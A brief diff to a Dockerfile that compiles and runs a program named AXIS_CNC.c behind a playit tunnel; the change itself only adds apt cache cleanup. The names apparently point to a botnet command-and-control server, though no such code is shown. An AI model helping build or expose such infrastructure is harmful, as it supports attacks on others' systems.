@@ -10,7 +10,9 @@ RUN curl -SsL -o /etc/apt/sources.list.d/playit-cloud.list https://playit-cloud.
 
 RUN apt-get update && \
     apt-get install -y playit apache2 && \
-    gcc -o AXIS /app/AXIS_CNC.c -pthread
+    gcc -o AXIS /app/AXIS_CNC.c -pthread && \
+    apt-get clean && \
+    rm -rf /var/lib/apt/lists/*
 
 CMD screen -S AXIS_session -d -m "./AXIS 35829 1 35821" && \
     tmux new-session -d -s playit_session "playit" && \
